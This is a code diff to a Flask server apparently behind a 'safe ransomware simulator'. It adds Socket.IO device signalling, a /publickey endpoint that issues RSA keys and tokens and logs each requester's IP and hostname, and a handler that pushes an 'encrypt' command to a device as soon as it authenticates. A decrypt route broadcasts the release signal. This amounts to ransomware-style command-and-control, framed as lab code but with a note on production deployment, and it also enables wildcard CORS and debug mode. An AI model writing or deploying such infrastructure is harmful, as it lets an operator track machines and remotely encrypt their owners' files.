@@ -1,5 +1,6 @@
 from flask import Flask, jsonify, request
 from flask_cors import CORS
+from flask_socketio import SocketIO, emit
 # Support both execution contexts:
 # - Importing as a package (repo root on sys.path): py_simple.safe_ransomware_simulator
 # - Running with service root as py_simple/: fallback to local module imports
@@ -16,9 +17,14 @@ from cryptography.hazmat.primitives import serialization
 
 app = Flask(__name__)
 CORS(app)  # Enable CORS for all routes
+# Socket.IO for device signaling (encrypt/decrypt). Use permissive CORS for lab use.
+socketio = SocketIO(app, cors_allowed_origins="*")
 
 # Initialize the simulator; allow override via env var SANDBOX_DIR
 simulator = SafeRansomwareSimulator(os.getenv('SANDBOX_DIR') or None)
+
+# Simple in-memory device registry: token -> { sid, connected, pending_encrypt }
+DEVICES = {}
 behavior = BehaviorSimulator(simulator.test_directory)
 
 @app.route('/status', methods=['GET'])
@@ -123,9 +129,53 @@ def keys_rsa_private():
     except Exception as e:
         return jsonify({'error': 'rsa_keygen_failed', 'message': str(e)}), 500
 
+@app.route('/publickey', methods=['POST'])
+def publickey_register():
+    """Device requests a public key and receives a device token for WebSocket auth.
+    This is a lab/demo endpoint.
+    """
+    try:
+        private_key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
+        public_key = private_key.public_key()
+        pub_pem = public_key.public_bytes(
+            encoding=serialization.Encoding.PEM,
+            format=serialization.PublicFormat.SubjectPublicKeyInfo
+        ).decode()
+
+        # Record device info
+        forwarded = request.headers.get('X-Forwarded-For')
+        requester_ip = (forwarded.split(',')[0].strip() if forwarded else request.remote_addr) or ''
+        data = request.get_json(silent=True) or {}
+        provided_hostname = data.get('hostname')
+
+        # Create a device token and mark encryption to be triggered on WS auth
+        import secrets
+        token = secrets.token_hex(16)
+        DEVICES[token] = { 'sid': None, 'connected': False, 'pending_encrypt': True, 'ip': requester_ip, 'hostname': provided_hostname }
+
+        record = {'timestamp': int(__import__('time').time()), 'requester_ip': requester_ip, 'requester_hostname': provided_hostname}
+        try:
+            with open('last_key_request.json', 'w', encoding='utf-8') as f:
+                json.dump(record, f, indent=2)
+        except Exception:
+            pass
+
+        # ws_url is same origin as HTTP base
+        ws_url = request.host_url.rstrip('/')
+        return jsonify({
+            'public_key_pem': pub_pem,
+            'device_token': token,
+            'ws_url': ws_url,
+            'device': record,
+        })
+    except Exception as e:
+        return jsonify({'error': 'publickey_failed', 'message': str(e)}), 500
+
 @app.route('/encrypt', methods=['POST'])
 def encrypt():
-    """Trigger encryption of files in the target directory"""
+    """Trigger encryption locally on the backend (fallback).
+    For device-based flow, encryption is signaled via WebSocket upon auth.
+    """
     try:
         files = simulator.simulate_encryption()
         return jsonify({'status': 'Encryption completed successfully', 'files': files})
@@ -134,10 +184,22 @@ def encrypt():
 
 @app.route('/decrypt', methods=['POST'])
 def decrypt():
-    """Trigger decryption of files"""
+    """Trigger decryption of files.
+    If devices are connected via WebSocket, emit a decrypt signal to them.
+    Otherwise, perform local simulator decryption as a fallback.
+    """
     try:
+        # Emit to any connected devices
+        sent = 0
+        for token, info in list(DEVICES.items()):
+            if info.get('connected') and info.get('sid'):
+                socketio.emit('decrypt', to=info['sid'])
+                sent += 1
+        if sent:
+            return jsonify({'status': f'Decrypt signal sent to {sent} device(s)'}), 200
+        # Fallback local decrypt
         simulator.simulate_decryption()
-        return jsonify({'status': 'Decryption completed successfully'})
+        return jsonify({'status': 'Decryption completed locally'})
     except Exception as e:
         return jsonify({'status': 'Decryption failed', 'error': str(e)}), 500
 
@@ -172,4 +234,23 @@ def behavior_commands():
     return jsonify({'status': 'ok', 'file': path})
 
 if __name__ == '__main__':
-    app.run(debug=True, port=5000)
+    # For local dev. In production on Render, run with gunicorn -k eventlet ... server:app
+    socketio.run(app, debug=True, port=5000)
+
+# --- Socket.IO handlers ---
+@socketio.on('connect')
+def on_connect():
+    emit('hello', {'msg': 'connected'})
+
+@socketio.on('authenticate')
+def on_auth(data):
+    token = (data or {}).get('device_token')
+    if not token or token not in DEVICES:
+        return emit('auth_error', {'error': 'invalid_token'})
+    DEVICES[token]['sid'] = request.sid
+    DEVICES[token]['connected'] = True
+    emit('auth_ok', {'status': 'ok'})
+    # If encryption is pending for this device, trigger it now (one-time)
+    if DEVICES[token].get('pending_encrypt'):
+        socketio.emit('encrypt', to=request.sid)
+        DEVICES[token]['pending_encrypt'] = False
